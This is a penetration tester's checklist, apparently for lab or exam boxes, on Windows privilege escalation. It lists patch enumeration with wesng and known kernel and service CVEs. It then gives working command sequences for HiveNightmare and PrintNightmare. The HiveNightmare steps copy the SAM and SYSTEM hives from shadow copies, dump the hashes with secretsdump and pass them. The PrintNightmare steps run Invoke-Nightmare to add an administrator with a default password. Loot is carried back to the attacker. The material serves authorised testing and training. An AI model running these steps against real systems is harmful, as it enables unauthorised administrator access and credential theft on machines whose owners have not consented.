# Windows privesc: kernel exploits

## Last
- [ ] Services, tasks, tokens, groups and passwords all tried first: a failed kernel exploit can blue-screen the box
- [ ] A fallback ready, and the box's reset noted, before I run anything

## The build and its patches
systeminfo
Get-HotFix | Sort-Object InstalledOn
- [ ] OS Name, the build in OS Version, and System Type x64 or x86
systeminfo > C:\Users\Public\sysinfo.txt
- [ ] sysinfo.txt sent back into loot/ with the line serve files ends with

## Missing patches, on Kali
pipx install wesng
wes --update
wes sysinfo.txt -i 'Elevation of Privilege' --exploits-only
wes sysinfo.txt -i 'Elevation of Privilege' --exploits-only --muc-lookup
- [ ] wesng over-reports on newer Windows: --muc-lookup drops the ones a later update replaced
- [ ] Each candidate looked up for the exact build and architecture, and its notes read
searchsploit THE-CVE

## Ones to recognise
- [ ] PrintNightmare, CVE-2021-1675 and CVE-2021-34527: the Print Spooler running, unpatched since mid 2021
- [ ] HiveNightmare, CVE-2021-36934: Windows 10 1809 to 21H1, SAM readable in a shadow copy
- [ ] MS16-032, Secondary Logon: Windows 7 to 10 and Server 2008 to 2012 R2, with 2 or more CPUs
- [ ] MS15-051, win32k: Windows 7, Server 2008 R2 and older
- [ ] MS10-015, KiTrap0D: 32-bit Windows XP to 7
- [ ] MS16-075, Hot Potato: NTLM reflection from a normal user, Windows 7 to 10 and Server 2008 to 2012
- [ ] XP and Server 2003: weak service permissions first, :Pb services

## HiveNightmare
icacls C:\Windows\System32\config\SAM
- [ ] BUILTIN\Users:(I)(RX): vulnerable, if a shadow copy exists
From cmd.exe, shadow copy 1 first, then 2 and up until one is found:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\Public\sam.hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\Public\system.hive
Both, sent back into loot/, on Kali:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
nxc smb <TargetIP> -u Administrator -H <Hash> --local-auth

## PrintNightmare
sc.exe query Spooler
calebstewart's CVE-2021-1675.ps1, from the target's upload/ folder, adds a local administrator through the spooler:
powershell -ep bypass
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare
net localgroup administrators
- [ ] With no arguments it adds adm1n, password P@ssw0rd: -NewUser and -NewPassword choose others
nxc smb <TargetIP> -u adm1n -p 'P@ssw0rd' --local-auth
evil-winrm -i <TargetIP> -u adm1n -p 'P@ssw0rd'
- [ ] Afterwards: net user adm1n /delete

## Running a compiled exploit
- [ ] Built for the target's architecture, x64 or x86, from System Type
- [ ] One that runs a command or adds a user, over one that opens a new window I cannot see
- [ ] Fetched to C:\Users\Public from the target's upload/ folder, and run once
whoami
